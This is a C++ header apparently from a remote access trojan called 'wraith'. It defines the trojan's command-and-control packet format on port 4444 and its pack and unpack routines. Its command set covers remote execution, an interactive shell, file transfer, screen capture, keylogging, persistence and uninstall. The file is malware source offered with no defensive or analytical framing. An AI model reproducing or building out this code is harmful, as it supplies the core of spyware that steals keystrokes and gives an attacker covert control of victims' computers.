#pragma once
#include <cstdint>
#include <vector>
#include <string>
#include <cstring>

namespace wraith {
constexpr uint32_t MAGIC = 0x57524154; // "WRAT"
constexpr uint16_t PORT  = 4444;

enum Cmd : uint8_t {
    HELO = 0x01, EXEC = 0x02, SHELL = 0x03, UPLOAD = 0x04,
    DOWNLOAD = 0x05, SCREEN = 0x06, KEYLOG = 0x07, PERSIST = 0x08,
    UNINSTALL = 0x09, SYSINFO = 0x0A, SHELL_IN = 0x0B, SHELL_OUT = 0x0C,
    FILE_DATA = 0x0D, FILE_DONE = 0x0E, OK = 0x0F, ERR = 0x10,
};

struct Packet {
    uint32_t magic;
    uint8_t  cmd;
    uint32_t len;
    std::vector<uint8_t> payload;
};

inline std::vector<uint8_t> pack(uint8_t cmd, const std::vector<uint8_t>& data) {
    std::vector<uint8_t> out;
    out.resize(9 + data.size());
    uint32_t m = MAGIC; memcpy(out.data(), &m, 4);
    out[4] = cmd;
    uint32_t l = (uint32_t)data.size(); memcpy(out.data()+5, &l, 4);
    if (!data.empty()) memcpy(out.data()+9, data.data(), data.size());
    return out;
}

inline bool unpack(const std::vector<uint8_t>& buf, Packet& p, size_t& consumed) {
    if (buf.size() < 9) return false;
    memcpy(&p.magic, buf.data(), 4);
    if (p.magic != MAGIC) return false;
    p.cmd = buf[4];
    memcpy(&p.len, buf.data()+5, 4);
    if (buf.size() < 9 + p.len) return false;
    p.payload.assign(buf.data()+9, buf.data()+9+p.len);
    consumed = 9 + p.len;
    return true;
}
}
